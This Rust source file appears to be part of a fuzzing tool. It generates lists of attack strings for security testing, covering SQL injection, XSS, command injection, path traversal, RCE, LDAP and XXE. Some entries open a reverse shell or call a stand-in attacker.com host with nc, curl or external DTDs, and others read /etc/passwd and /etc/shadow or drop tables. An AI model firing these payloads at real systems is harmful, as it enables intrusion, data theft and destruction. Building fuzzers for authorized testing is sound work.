/// Payload generator for fuzzing campaigns
pub struct PayloadGenerator {
    payload_type: PayloadType,
}

#[derive(Debug, Clone, Copy)]
pub enum PayloadType {
    Numbers,
    Strings,
    SqlInjection,
    XssPayloads,
    CommandInjection,
    PathTraversal,
    RcePayloads,
    LdapInjection,
    XmlInjection,
}

impl PayloadGenerator {
    pub fn new(payload_type: PayloadType) -> Self {
        Self { payload_type }
    }

    pub fn generate(&self) -> Vec<String> {
        match self.payload_type {
            PayloadType::Numbers => Self::number_payloads(),
            PayloadType::Strings => Self::string_payloads(),
            PayloadType::SqlInjection => Self::sql_injection_payloads(),
            PayloadType::XssPayloads => Self::xss_payloads(),
            PayloadType::CommandInjection => Self::command_injection_payloads(),
            PayloadType::PathTraversal => Self::path_traversal_payloads(),
            PayloadType::RcePayloads => Self::rce_payloads(),
            PayloadType::LdapInjection => Self::ldap_injection_payloads(),
            PayloadType::XmlInjection => Self::xml_injection_payloads(),
        }
    }

    fn number_payloads() -> Vec<String> {
        (0..20).map(|i| i.to_string()).collect()
    }

    fn string_payloads() -> Vec<String> {
        vec![
            "test", "admin", "root", "username", "password", "secret", "api_key", "token",
            "user", "data", "test123", "123456", "qwerty", "pass", "admin123", "letmein",
            "welcome", "monkey", "dragon", "master",
        ]
        .into_iter()
        .map(|s| s.to_string())
        .collect()
    }

    fn sql_injection_payloads() -> Vec<String> {
        vec![
            "' OR '1'='1",
            "' OR '1'='1' --",
            "' OR 1=1 --",
            "1' OR 1=1 --",
            "admin' --",
            "' OR 'a'='a",
            "1' UNION SELECT NULL --",
            "' AND 1=1 --",
            "' AND 1=2 --",
            "1' AND '1'='1",
            "' OR 'x'='x",
            "'; DROP TABLE users; --",
            "' UNION ALL SELECT NULL,NULL,NULL --",
            "' UNION SELECT @@version --",
            "1' AND SLEEP(5) --",
            "' OR BENCHMARK(1000000,MD5('a')) --",
            "' OR EXISTS(SELECT * FROM users) --",
            "'; WAITFOR DELAY '00:00:05' --",
            "' AND 1=CAST(CHAR(65)||CHAR(66) AS INT) --",
            "' OR 'a'='a' /*",
        ]
        .into_iter()
        .map(|s| s.to_string())
        .collect()
    }

    fn xss_payloads() -> Vec<String> {
        vec![
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            "<iframe src=\"javascript:alert('XSS')\"></iframe>",
            "<body onload=alert('XSS')>",
            "<input onfocus=alert('XSS') autofocus>",
            "<marquee onstart=alert('XSS')>",
            "<details open ontoggle=alert('XSS')>",
            "<video src=x onerror=alert('XSS')>",
            "\"><script>alert('XSS')</script>",
            "'><script>alert('XSS')</script>",
            "<script>eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))</script>",
            "<img src=x:alert(alt) onerror=eval(src) alt='XSS'>",
            "<style>@import'http://example.com/xss.css';</style>",
            "<base href=javascript:alert('XSS')//>",
            "<form action=javascript:alert('XSS')>",
            "<button onclick=alert('XSS')>Click</button>",
            "<embed src=javascript:alert('XSS')>",
            "<object data=javascript:alert('XSS')>",
            "<link rel=stylesheet href=javascript:alert('XSS')>",
        ]
        .into_iter()
        .map(|s| s.to_string())
        .collect()
    }

    fn command_injection_payloads() -> Vec<String> {
        vec![
            "; ls",
            "| ls",
            "& ls",
            "&& ls",
            "`ls`",
            "$(ls)",
            "| cat /etc/passwd",
            "; cat /etc/passwd",
            "\n ls",
            "| whoami",
            "; whoami",
            "& whoami",
            "| id",
            "; id",
            "$(whoami)",
            "`whoami`",
            "| nc attacker.com 4444",
            "; bash -i >& /dev/tcp/attacker.com/4444 0>&1",
            "| curl attacker.com",
            "; curl attacker.com",
        ]
        .into_iter()
        .map(|s| s.to_string())
        .collect()
    }

    fn path_traversal_payloads() -> Vec<String> {
        vec![
            "../",
            "../../",
            "../../../",
            "../../../../",
            "../../../../../",
            "..\\",
            "..\\..\\",
            "..\\..\\..\\",
            "../../../../etc/passwd",
            "../../../../windows/win.ini",
            "..\\..\\..\\windows\\win.ini",
            "%2e%2e/",
            "..%252f",
            "..;/",
            "%2e%2e%2f",
            "....//",
            "..%c0%af",
            "%252e%252e%252f",
            "..%f0%ae",
            "/%2e%2e/%2e%2e/",
        ]
        .into_iter()
        .map(|s| s.to_string())
        .collect()
    }

    fn rce_payloads() -> Vec<String> {
        vec![
            "() { :; }; echo vulnerable",
            "10.0.0.1 && echo 'RCE'",
            "10.0.0.1; echo 'RCE'",
            "10.0.0.1 | echo 'RCE'",
            "10.0.0.1 `echo 'RCE'`",
            "10.0.0.1 $(echo 'RCE')",
            "${IFS}cat${IFS}/etc/passwd",
            "cat</etc/passwd",
            "{cat,/etc/passwd}",
            "for i in {1..4}; do echo RCE; done",
            "eval(base64_decode('...'))",
            "exec('ls')",
            "system('whoami')",
            "passthru('id')",
            "shell_exec('cat /etc/passwd')",
            "proc_open('ls',array(),array())",
            "python -c 'import os; os.system(\"whoami\")'",
            "perl -e 'system(\"ls\")'",
            "ruby -e 'system(\"whoami\")'",
            "php -r 'system(\"id\");'",
        ]
        .into_iter()
        .map(|s| s.to_string())
        .collect()
    }

    fn ldap_injection_payloads() -> Vec<String> {
        vec![
            "*",
            "*)(uid=*",
            "*)(|(uid=*",
            "admin*",
            "*)(&",
            "*)(mail=*",
            "*)(objectClass=*",
            "*)(sn=*",
            "*)(cn=*",
            "*)(userPassword=*",
            "admin)(|(cn=*",
            "*))(&(cn=*",
            "admin*))(&",
            "*)(|(uid=admin",
            "*,*,cn=*",
            "admin)(|(|(cn=*",
            "*)(|(mail=*",
            "admin)(|(objectClass=*",
            "*))(&(uid=*",
            "admin*))(&(cn=*",
        ]
        .into_iter()
        .map(|s| s.to_string())
        .collect()
    }

    fn xml_injection_payloads() -> Vec<String> {
        vec![
            "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY test SYSTEM 'file:///etc/passwd'>]><root>&test;</root>",
            "<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]>",
            "<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM \"file:///etc/passwd\" >]><foo>&xxe;</foo>",
            "<!DOCTYPE foo [<!ENTITY % xxe SYSTEM \"http://attacker.com/xxe.dtd\"> %xxe;]>",
            "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY % dtd SYSTEM \"http://attacker.com/evil.dtd\">%dtd;]><root/>",
            "<![CDATA[<script>alert('XSS')</script>]]>",
            "<!--<script>alert('XSS')</script>-->",
            "<?php echo 'RCE'; ?>",
            "<![CDATA[<?php system('id'); ?>]]>",
            "<!ENTITY % file SYSTEM \"file:///etc/passwd\">",
            "<!DOCTYPE foo [<!ENTITY % xxe SYSTEM \"file:///etc/shadow\">%xxe;]>",
            "<!DOCTYPE foo [<!ENTITY % xxe SYSTEM \"php://filter/convert.base64-encode/resource=/etc/passwd\">%xxe;]>",
            "<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"php://expect://whoami\">]>",
            "<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"jar:file:///path/to/file.jar!/file.txt\">]>",
            "<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"rar:///path/to/file.rar\">]>",
            "<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"ogg:///path/to/file.ogg\">]>",
            "<!DOCTYPE foo [<!ENTITY % xxe SYSTEM \"compress.zlib:///etc/passwd\">%xxe;]>",
            "<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"data:text/plain,Hello\">]>",
            "<!DOCTYPE foo [<!ENTITY % xxe SYSTEM \"expect://whoami\">%xxe;]>",
            "<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"glob:///path/to/*.xml\">]>",
        ]
        .into_iter()
        .map(|s| s.to_string())
        .collect()
    }

    /// Get payload count for a type
    pub fn count(&self) -> usize {
        self.generate().len()
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_number_payloads() {
        let generator = PayloadGenerator::new(PayloadType::Numbers);
        let payloads = generator.generate();
        assert_eq!(payloads.len(), 20);
    }

    #[test]
    fn test_sql_injection_payloads() {
        let generator = PayloadGenerator::new(PayloadType::SqlInjection);
        let payloads = generator.generate();
        assert!(!payloads.is_empty());
        assert!(payloads[0].contains("'"));
    }

    #[test]
    fn test_xss_payloads() {
        let generator = PayloadGenerator::new(PayloadType::XssPayloads);
        let payloads = generator.generate();
        assert!(!payloads.is_empty());
        assert!(payloads[0].contains("<script>"));
    }
}
